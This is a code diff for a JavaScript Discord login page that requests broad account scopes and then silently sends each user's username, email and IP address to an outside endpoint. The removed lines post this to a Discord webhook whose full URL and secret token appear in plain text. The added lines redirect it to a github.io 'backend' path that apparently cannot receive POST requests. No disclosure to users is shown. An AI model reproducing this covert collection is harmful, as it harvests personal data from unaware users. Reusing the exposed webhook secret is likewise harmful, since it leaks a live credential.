@@ -11,7 +11,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const RESPONSE_TYPE = 'token';
     const SCOPE = 'identify guilds gdm.join guilds.join email connections';
 
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1243196183640277032/H46qVRuI2XvANY67HWcqYOpacBOJh1TOMi5Ibgh2axVBLVvOeTzmnKWEf1xnBEbd3ho9';  // Replace with your actual webhook URL
+const BACKEND_URL = 'https://colibribot.github.io/home/beta.html/log-user';
 
     const getLoginURL = () => {
         const params = new URLSearchParams({
@@ -29,7 +29,6 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     const handleLogout = () => {
-        localStorage.removeItem('discord_access_token');
         location.reload();
     };
 
@@ -61,7 +60,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    const sendToWebhook = async (user, ip) => {
+    const logUserToBackend = async (user, ip) => {
         const payload = {
             username: user.username,
             email: user.email,
@@ -71,7 +70,7 @@ document.addEventListener('DOMContentLoaded', () => {
         };
 
         try {
-            await fetch(WEBHOOK_URL, {
+            await fetch(BACKEND_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -79,7 +78,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 body: JSON.stringify(payload)
             });
         } catch (error) {
-            console.error('Error sending data to webhook:', error);
+            console.error('Error logging user to backend:', error);
         }
     };
 
@@ -98,20 +97,16 @@ document.addEventListener('DOMContentLoaded', () => {
         const accessToken = params.get('access_token');
 
         if (accessToken) {
-            localStorage.setItem('discord_access_token', accessToken);
             window.location.hash = '';
         }
 
-        const storedToken = localStorage.getItem('discord_access_token');
-
-        if (storedToken) {
-            const user = await getUserInfo(storedToken);
+        if (accessToken) {
+            const user = await getUserInfo(accessToken);
             if (user) {
                 displayProfile(user);
                 const ip = await getIP();
-                sendToWebhook(user, ip);
+                logUserToBackend(user, ip);
             } else {
-                localStorage.removeItem('discord_access_token');
                 loginBtn.style.display = 'block';
                 profilePic.style.display = 'none';
             }
